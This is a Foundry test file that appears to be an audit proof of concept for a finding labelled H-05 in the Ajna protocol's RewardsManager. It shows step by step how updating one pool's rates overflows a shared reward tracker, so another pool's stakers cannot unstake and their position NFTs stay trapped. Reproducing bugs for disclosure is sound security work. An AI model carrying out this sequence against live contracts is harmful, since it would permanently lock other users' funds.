// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "forge-std/Test.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import { ERC20Pool }        from "../src/ajna/src/ERC20Pool.sol";
import { ERC20PoolFactory } from "../src/ajna/src/ERC20PoolFactory.sol";
import { ERC721PoolFactory }from "../src/ajna/src/ERC721PoolFactory.sol";
import { PositionManager }  from "../src/ajna/src/PositionManager.sol";
import { RewardsManager }   from "../src/ajna/src/RewardsManager.sol";
import { PoolInfoUtils }    from "../src/ajna/src/PoolInfoUtils.sol";
import { IPool }            from "../src/ajna/src/interfaces/pool/IPool.sol";
import { IPositionManager } from "../src/ajna/src/interfaces/position/IPositionManager.sol";
import { IPositionManagerOwnerActions } from "../src/ajna/src/interfaces/position/IPositionManagerOwnerActions.sol";
import { Maths }            from "../src/ajna/src/libraries/internal/Maths.sol";

/// Minimal real ERC20 (mintable) used for the opaque collateral/quote tokens.
contract MintableToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

/// Minimal real AJNA token: mintable + `burn(uint256)` exactly as Ajna's reserve
/// auction (`IERC20Token.burn`) requires.
contract AjnaToken is ERC20 {
    constructor() ERC20("Ajna", "AJNA") {}
    function mint(address to, uint256 a) external { _mint(to, a); }
    function burn(uint256 a) external { _burn(msg.sender, a); }
}

/**
 * @title  H-05: cross-pool underflow in RewardsManager blocks unstake / claim
 * @notice Real, local (no-fork) reproduction. Deploys the REAL Ajna
 *         ERC20PoolFactory / PositionManager / RewardsManager / two ERC20Pools,
 *         drives REAL reserve-auction burns in both pools, and shows that a big
 *         pool's bucket-rate update inflates the GLOBAL `updateRewardsClaimed`
 *         epoch tracker above a small pool's per-pool `rewardsCap`. The next
 *         interaction with the small pool then reverts with an arithmetic
 *         underflow at RewardsManager.sol:725
 *         (`updatedRewards_ = rewardsCap - rewardsClaimedInEpoch`), permanently
 *         locking the small pool staker's NFT + LP position inside RewardsManager.
 */
contract PoC_20073 is Test {
    AjnaToken         internal ajna;
    ERC20PoolFactory  internal factory;
    PositionManager   internal positionManager;
    RewardsManager    internal rewards;
    PoolInfoUtils     internal poolUtils;

    // big pool (large burn -> large cap) and small pool (tiny burn -> tiny cap)
    MintableToken internal collBig;
    MintableToken internal quoteBig;
    MintableToken internal collSmall;
    MintableToken internal quoteSmall;
    ERC20Pool     internal poolBig;
    ERC20Pool     internal poolSmall;

    uint256[] internal depositIndexes;

    address internal borrower = makeAddr("borrower");

    function setUp() public {
        // foundry.toml pins the 8 external delegatecall libraries at fixed
        // addresses (so the Playground synthetic compiles with concrete link
        // addresses and injects the same runtime via anvil_state). forge does
        // not auto-deploy pinned libraries, so place their runtime here.
        _etchLibs();

        // move well past the reserve-auction 2-week floor
        vm.warp(block.timestamp + 30 weeks);

        ajna            = new AjnaToken();
        factory         = new ERC20PoolFactory(address(ajna));
        positionManager = new PositionManager(factory, new ERC721PoolFactory(address(ajna)));
        rewards         = new RewardsManager(address(ajna), IPositionManager(address(positionManager)));
        poolUtils       = new PoolInfoUtils();

        // fund the rewards contract with AJNA so it can pay rewards
        ajna.mint(address(rewards), 100_000_000 * 1e18);

        collBig    = new MintableToken("CollBig", "CB");
        quoteBig   = new MintableToken("QuoteBig", "QB");
        collSmall  = new MintableToken("CollSmall", "CS");
        quoteSmall = new MintableToken("QuoteSmall", "QS");

        poolBig   = ERC20Pool(factory.deployPool(address(collBig),   address(quoteBig),   0.05 * 1e18));
        poolSmall = ERC20Pool(factory.deployPool(address(collSmall), address(quoteSmall), 0.05 * 1e18));

        depositIndexes = new uint256[](5);
        depositIndexes[0] = 9;
        depositIndexes[1] = 1;
        depositIndexes[2] = 2;
        depositIndexes[3] = 3;
        depositIndexes[4] = 4;
    }

    /*//////////////////////////////////////////////////////////////
                              THE EXPLOIT
    //////////////////////////////////////////////////////////////*/

    function test_H05_cross_pool_underflow_locks_small_pool_stake() public {
        // 1. stake a real LP position in each pool (records bucket rate at epoch 0)
        uint256 tokenBig   = _mintMemorializeStake(poolBig,   collBig,   quoteBig);
        uint256 tokenSmall = _mintMemorializeStake(poolSmall, collSmall, quoteSmall);

        // 2. draw debt in both pools so interest (and thus reserves) accrue
        _drawDebt(poolBig,   collBig,   quoteBig,   300 * 1e18); // large debt -> large reserves/burn
        _drawDebt(poolSmall, collSmall, quoteSmall, 30  * 1e18); // small debt -> small reserves/burn

        // 3. let interest accrue for BOTH pools with a single warp (keeps both
        //    burn timestamps inside the 2-week UPDATE_PERIOD used later)
        vm.warp(block.timestamp + 26 weeks);

        // 4. repay + run a real reserve auction (burn) in each pool -> burn epoch 1
        uint256 burnBig   = _repayKickTake(poolBig,   quoteBig);
        uint256 burnSmall = _repayKickTake(poolSmall, quoteSmall);

        assertGt(burnBig,   0, "big pool burned 0");
        assertGt(burnSmall, 0, "small pool burned 0");
        assertGt(burnBig, burnSmall, "big pool must burn more than small pool");

        assertEq(IPool(address(poolBig)).currentBurnEpoch(),   1, "big epoch != 1");
        assertEq(IPool(address(poolSmall)).currentBurnEpoch(), 1, "small epoch != 1");

        // both pools share the SAME global epoch-1 update-reward tracker
        uint256 capSmall = Maths.wmul(0.1 * 1e18, burnSmall); // per-pool UPDATE cap for the small pool

        // ---------------------------------------------------------------
        // BASELINE (snapshot): with the global tracker still 0, the small
        // pool staker can unstake and retrieve their NFT normally.
        // ---------------------------------------------------------------
        uint256 snap = vm.snapshot();
        assertEq(rewards.updateRewardsClaimed(1), 0, "tracker should start at 0");
        rewards.unstake(tokenSmall);
        assertEq(positionManager.ownerOf(tokenSmall), address(this), "baseline: NFT returned");
        vm.revertTo(snap);

        // ---------------------------------------------------------------
        // ATTACK: update the BIG pool's exchange rates. This pushes the
        // shared updateRewardsClaimed[1] above the small pool's tiny cap.
        // ---------------------------------------------------------------
        rewards.updateBucketExchangeRatesAndClaim(address(poolBig), depositIndexes);

        uint256 trackerAfter = rewards.updateRewardsClaimed(1);
        assertGt(trackerAfter, capSmall,
            "big-pool update did not push global tracker above small pool cap");

        // HARM: the small pool staker can no longer unstake. RewardsManager.sol:725
        // computes `rewardsCap(small) - updateRewardsClaimed[1]` -> underflow -> revert.
        vm.expectRevert(stdError.arithmeticError);
        rewards.unstake(tokenSmall);

        // claimRewards is bricked the same way
        vm.expectRevert(stdError.arithmeticError);
        rewards.claimRewards(tokenSmall, 1);

        // The NFT (an LP position worth ~5,000 quote tokens) is still trapped in
        // the RewardsManager: the staker cannot withdraw it.
        assertEq(positionManager.ownerOf(tokenSmall), address(rewards),
            "harm: small pool NFT permanently locked in RewardsManager");

        emit log_named_uint("big pool AJNA burned      ", burnBig);
        emit log_named_uint("small pool AJNA burned     ", burnSmall);
        emit log_named_uint("global updateRewardsClaimed", trackerAfter);
        emit log_named_uint("small pool per-pool cap    ", capSmall);
    }

    /*//////////////////////////////////////////////////////////////
                               HELPERS
    //////////////////////////////////////////////////////////////*/

    // Place the runtime of the 8 pinned external libraries at their fixed
    // foundry.toml addresses (matches the Playground anvil_state injection).
    function _etchLibs() internal {
        vm.etch(0x0000000000000000000000000000000000000105, vm.getDeployedCode("SettlerActions.sol:SettlerActions"));
        vm.etch(0x0000000000000000000000000000000000000101, vm.getDeployedCode("BorrowerActions.sol:BorrowerActions"));
        vm.etch(0x0000000000000000000000000000000000000102, vm.getDeployedCode("KickerActions.sol:KickerActions"));
        vm.etch(0x0000000000000000000000000000000000000103, vm.getDeployedCode("LenderActions.sol:LenderActions"));
        vm.etch(0x0000000000000000000000000000000000000104, vm.getDeployedCode("TakerActions.sol:TakerActions"));
        vm.etch(0x0000000000000000000000000000000000000106, vm.getDeployedCode("PoolCommons.sol:PoolCommons"));
        vm.etch(0x0000000000000000000000000000000000000107, vm.getDeployedCode("LPActions.sol:LPActions"));
        vm.etch(0x0000000000000000000000000000000000000108, vm.getDeployedCode("PositionNFTSVG.sol:PositionNFTSVG"));
    }

    // add quote to buckets, mint+memorialize an LP NFT, and stake it
    function _mintMemorializeStake(
        ERC20Pool pool,
        MintableToken coll,
        MintableToken quote
    ) internal returns (uint256 tokenId) {
        coll;
        uint256 mintAmount = 1_000 * 1e18;

        quote.mint(address(this), mintAmount * depositIndexes.length);
        quote.approve(address(pool), type(uint256).max);

        IPositionManagerOwnerActions.MintParams memory mintParams =
            IPositionManagerOwnerActions.MintParams(address(this), address(pool), keccak256("ERC20_NON_SUBSET_HASH"));
        tokenId = positionManager.mint(mintParams);

        uint256[] memory lpBalances = new uint256[](depositIndexes.length);
        for (uint256 i = 0; i < depositIndexes.length; i++) {
            pool.addQuoteToken(mintAmount, depositIndexes[i], type(uint256).max);
            (lpBalances[i], ) = pool.lenderInfo(depositIndexes[i], address(this));
        }
        pool.increaseLPAllowance(address(positionManager), depositIndexes, lpBalances);

        IPositionManagerOwnerActions.MemorializePositionsParams memory mp =
            IPositionManagerOwnerActions.MemorializePositionsParams(tokenId, depositIndexes);
        positionManager.memorializePositions(mp);

        // stake (records bucket exchange rate at epoch 0)
        positionManager.approve(address(rewards), tokenId);
        rewards.stake(tokenId);
    }

    function _drawDebt(
        ERC20Pool pool,
        MintableToken coll,
        MintableToken quote,
        uint256 borrowAmount
    ) internal {
        quote;
        uint256 limitIndex = 3;
        uint256 collateralToPledge =
            Maths.wdiv(Maths.wmul(borrowAmount, 1.5 * 1e18), poolUtils.indexToPrice(limitIndex)) + 10 * 1e18;

        coll.mint(borrower, collateralToPledge);
        vm.startPrank(borrower);
        coll.approve(address(pool), type(uint256).max);
        pool.drawDebt(borrower, borrowAmount, limitIndex, collateralToPledge);
        vm.stopPrank();
    }

    // repay the debt (creates claimable reserves), kick a reserve auction and take
    // it (burning AJNA). Returns the AJNA burned (== burnInfo totalBurned at epoch 1).
    function _repayKickTake(ERC20Pool pool, MintableToken quote) internal returns (uint256 burned) {
        // fund borrower to repay in full (principal + accrued interest)
        quote.mint(borrower, 1_000_000 * 1e18);
        vm.startPrank(borrower);
        quote.approve(address(pool), type(uint256).max);
        pool.repayDebt(borrower, type(uint256).max, 0, borrower, 7388);
        vm.stopPrank();

        // kick the reserve auction
        pool.kickReserveAuction();

        // let auction price decrease to a sane level, then take (burns AJNA)
        vm.warp(block.timestamp + 24 hours);

        ( , , uint256 claimable, , ) = poolUtils.poolReservesInfo(address(pool));
        // fund + approve AJNA for the take (auction price is high, so mint plenty)
        ajna.mint(address(this), 900_000_000 * 1e18);
        ajna.approve(address(pool), type(uint256).max);
        pool.takeReserves(claimable);

        ( , , burned) = IPool(address(pool)).burnInfo(IPool(address(pool)).currentBurnEpoch());
    }
}
